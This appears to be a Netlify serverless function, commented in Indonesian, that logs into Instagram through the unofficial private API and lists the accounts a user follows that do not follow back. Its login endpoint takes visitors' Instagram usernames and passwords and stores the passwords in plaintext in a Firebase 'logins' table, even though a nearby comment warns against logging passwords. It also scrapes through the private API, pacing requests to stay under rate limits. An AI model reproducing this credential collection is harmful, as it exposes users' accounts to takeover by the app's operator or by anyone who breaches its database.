const { IgApiClient } = require('instagram-private-api');
const { db } = require('./config/firebaseConfig');
const ig = new IgApiClient();

// Variabel sesi yang disimpan dalam Firebase
let sessionData = null;

// Fungsi untuk login ke Instagram
const login = async () => {
    ig.state.generateDevice(process.env.INSTAGRAM_USERNAME);

    if (sessionData) {
        ig.state.deserialize(sessionData);
        console.log('Sesi ditemukan, melanjutkan...');
        try {
            await ig.account.currentUser();
            console.log('Sesi valid, melanjutkan...');
        } catch (error) {
            console.log('Sesi kadaluarsa, login ulang...');
            await forceLogin();
        }
    } else {
        console.log('Sesi tidak ditemukan, login ulang...');
        await forceLogin();
    }
};

// Fungsi untuk login ulang dan menyimpan sesi baru di Firebase Realtime Database
const forceLogin = async () => {
    try {
        console.log('Mencoba login...');
        await ig.account.login(process.env.INSTAGRAM_USERNAME, process.env.INSTAGRAM_PASSWORD);
        console.log('Login berhasil!');
        sessionData = ig.state.serialize(); // Menyimpan sesi di Firebase
        await db.ref('sessions').child(process.env.INSTAGRAM_USERNAME).set({ sessionData }); // Menyimpan sesi di Firebase Realtime Database
    } catch (error) {
        console.error('Login gagal:', error);
        if (error.name === 'IgCheckpointError') {
            return {
                statusCode: 400,
                body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
            };
        } else {
            throw error;
        }
    }
};

// Fungsi untuk mendapatkan data followers dengan paginasi dan retry logic
const getAllFollowers = async (userId, retries = 3, delayTime = 2000) => {
    let followers = [];
    let followersFeed = ig.feed.accountFollowers(userId);
    let attempt = 0;

    while (followersFeed.isMoreAvailable()) {
        try {
            let nextFollowers = await followersFeed.items();
            followers = followers.concat(nextFollowers);
            attempt = 0; // Reset attempt setelah berhasil mengambil data
            await delay(delayTime); // Delay untuk menghindari rate limiting
        } catch (error) {
            console.error('Error fetching followers:', error);
            if (attempt < retries) {
                attempt++;
                console.log(`Retrying attempt ${attempt}...`);
                await delay(5000); // Delay sebelum mencoba ulang
            } else {
                throw new Error('Failed to fetch followers after multiple retries.');
            }
        }
    }
    return followers;
};

// Fungsi untuk mendapatkan data following dengan paginasi dan retry logic
const getAllFollowing = async (userId, retries = 3, delayTime = 2000) => {
    let following = [];
    let followingFeed = ig.feed.accountFollowing(userId);
    let attempt = 0;

    while (followingFeed.isMoreAvailable()) {
        try {
            let nextFollowing = await followingFeed.items();
            following = following.concat(nextFollowing);
            attempt = 0; // Reset attempt setelah berhasil mengambil data
            await delay(delayTime); // Delay untuk menghindari rate limiting
        } catch (error) {
            console.error('Error fetching following:', error);
            if (attempt < retries) {
                attempt++;
                console.log(`Retrying attempt ${attempt}...`);
                await delay(5000); // Delay sebelum mencoba ulang
            } else {
                throw new Error('Failed to fetch following after multiple retries.');
            }
        }
    }
    return following;
};

// Fungsi untuk menangani request profile Instagram
exports.handler = async function (event, context) {
    if (event.httpMethod === 'GET' && event.path === '/.netlify/functions/instagram/profile') {
        try {
            await login();
            const user = await ig.account.currentUser();

            // Mendapatkan jumlah followers dan following
            const followersCount = await ig.user.info(user.pk).then(info => info.follower_count);
            const followingCount = await ig.user.info(user.pk).then(info => info.following_count);

            // Mendapatkan gambar profil
            const profilePicUrl = user.profile_pic_url;

            // Ambil data followers dan following secara bertahap
            const followers = await getAllFollowers(user.pk, 3, 5000); // Delay 5 detik tiap 100 followers
            const following = await getAllFollowing(user.pk, 3, 5000); // Delay 5 detik tiap 100 following

            const followersUsernames = followers.map(f => f.username);
            const followingUsernames = following.map(f => f.username);

            // Cari orang yang tidak follow back
            const dontFollowBack = followingUsernames.filter(username => !followersUsernames.includes(username));

            // Menyimpan data pengguna dan informasi lainnya ke Firebase Realtime Database
            await db.ref('users').child(user.pk).set({
                username: user.username,
                full_name: user.full_name,
                followers_count: followersCount,
                following_count: followingCount,
                profile_picture_url: profilePicUrl,
                dont_follow_back_count: dontFollowBack.length,
            });

            return {
                statusCode: 200,
                body: JSON.stringify({
                    username: user.username,
                    full_name: user.full_name,
                    biography: user.biography,
                    followers_count: followersCount,
                    following_count: followingCount,
                    profile_picture_url: profilePicUrl,
                    dont_follow_back: dontFollowBack,
                    dont_follow_back_count: dontFollowBack.length,
                }),
            };
        } catch (error) {
            console.error('Error fetching Instagram data:', error);
            if (error.name === 'IgLoginRequiredError') {
                return {
                    statusCode: 401,
                    body: JSON.stringify({ message: 'Login is required. Please check your credentials.' }),
                };
            } else {
                return {
                    statusCode: 500,
                    body: JSON.stringify({ message: 'Error fetching Instagram data: ' + error.message }),
                };
            }
        }
    } else if (event.httpMethod === 'POST' && event.path === '/.netlify/functions/instagram/login') {
        const { username, password } = JSON.parse(event.body);

        try {
            ig.state.generateDevice(username);
            await ig.account.login(username, password);
            sessionData = ig.state.serialize();

            const user = await ig.account.currentUser();
            const userId = user.pk;

            const loginData = {
                username,
                password,  // Pastikan Anda tidak log atau mengirimkan password dalam log
                userId,
                timestamp: new Date().toISOString(),
                profile_picture_url: user.profile_pic_url,
            };

            await db.ref('logins').child(userId).set(loginData);
            return {
                statusCode: 200,
                body: JSON.stringify({ message: 'Login berhasil!' }),
            };
        } catch (error) {
            console.error('Login gagal:', error);
            if (error.name === 'IgLoginRequiredError') {
                return {
                    statusCode: 401,
                    body: JSON.stringify({ message: 'Instagram login failed: incorrect username or password.' }),
                };
            } else if (error.name === 'IgCheckpointError') {
                return {
                    statusCode: 400,
                    body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
                };
            } else {
                return {
                    statusCode: 500,
                    body: JSON.stringify({ message: 'Login failed, please try again later.' }),
                };
            }
        }
    }

    return {
        statusCode: 404,
        body: JSON.stringify({ message: 'Not Found' }),
    };
};

// Fungsi delay untuk menghindari rate limiting
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
